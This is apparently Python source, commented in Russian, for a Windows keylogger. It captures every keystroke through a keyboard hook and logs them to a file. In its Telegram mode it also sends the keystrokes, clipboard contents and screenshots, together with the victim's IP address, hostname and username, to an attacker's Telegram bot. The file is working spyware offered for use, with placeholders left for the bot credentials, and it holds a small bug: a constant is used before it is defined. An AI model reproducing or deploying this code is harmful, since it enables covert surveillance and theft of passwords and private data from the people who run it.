import pyHook         
import pythoncom      
import pyperclip     
import requests      
import PIL.ImageGrab  

import win32event     
import win32api       
import winerror       
import win32console  
import win32gui       

import random        
import socket        
import sys           
import os            
import io            
from multiprocessing import Queue # фиксим баг при заморозке модуля requests через cx_Freeze
                                  # https://stackoverflow.com/questions/40768570/importerror-no-module-named-queue-while-running-my-app-freezed-with-cx-freeze


# Можно скрыть окно консоли
# window = win32console.GetConsoleWindow()
# win32gui.ShowWindow(window,0) 

TGBOT_TOKEN = 'токен вашего бота'
TGBOT_CHAT_ID = 'chat_id вашего бота'

filename = ''.join(random.choices(ASCII_UPPERCASE + ASCII_LOWERCASE, k=8))
filepath = f'путь до файла, в котором будут лежать логи{filename}'


ASCII_UPPERCASE = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ASCII_LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'

key_events = 'START'
savepoint = 10
clipboard_max_len = 100
tg_mode = 0

# если процесс уже запущен - выходим
mutex = win32event.CreateMutex(None, 1, 'mutex_car_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit()


def main():
    global tg_mode,savepoint, clipboard_max_len

    if len(sys.argv) >= 3:
        try: 
            savepoint = int(sys.argv[1])
            clipboard_max_len = int(sys.argv[2])
        except ValueError:
            pass
    
    if 'tg' in sys.argv:
        tg_mode = 1

    # перехватываем нажатия
    hook_manager = pyHook.HookManager() 
    hook_manager.KeyDown = on_keyboard_event
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()


def on_keyboard_event(event):
    global key_events

    try:
        key_events = f'{key_events} {event.Key}'
    except TypeError:
        pass

    log()

    return True


def log():
    global tg_mode, key_events, savepoint, clipboard_max_len

    if len(key_events) >= savepoint:
        with open(filepath, 'a') as f:
            f.write(key_events)

        if tg_mode:
            tgbot_send_message(key_events.strip(), content='Keyboard')
            clipboard = pyperclip.paste()
            
            if clipboard and clipboard.isprintable() and len(clipboard) <= clipboard_max_len:
                tgbot_send_message(clipboard.strip(), content='Clipboard')
            tgbot_send_photo(screenshot())
        
        key_events = ''

def tgbot_send_message(message, content):
    try:
        ip = requests.get('http://httpbin.org/ip').json()

        ip = ip['origin'].split(',')[0]
        hostname = socket.gethostname()
        username = os.getlogin()

    except:
        ip = None
        hostname = None
        username = None

    message = f'''
\U0001F4E4 IP: {ip}
\U0001F5A5 hostname: {hostname}
\U0001F5A5 username: {username} 

_{content}:_ {message} ''' 


    params = {
        'chat_id': TGBOT_CHAT_ID,
        'parse_mode': 'Markdown',
        'text': message
    }

    requests.get(f'https://api.telegram.org/bot{TGBOT_TOKEN}/sendMessage', params=params)


def tgbot_send_photo(photo):
    params = {'chat_id': TGBOT_CHAT_ID }
    files = {'photo': photo}
    requests.post(f'https://api.telegram.org/bot{TGBOT_TOKEN}/sendPhoto', params=params, files=files)

def screenshot():
    im = PIL.ImageGrab.grab()
    fp = io.BytesIO()
    im.save(fp, 'JPEG')
    fp.seek(0)
    
    return fp


if __name__ == '__main__':
    main()

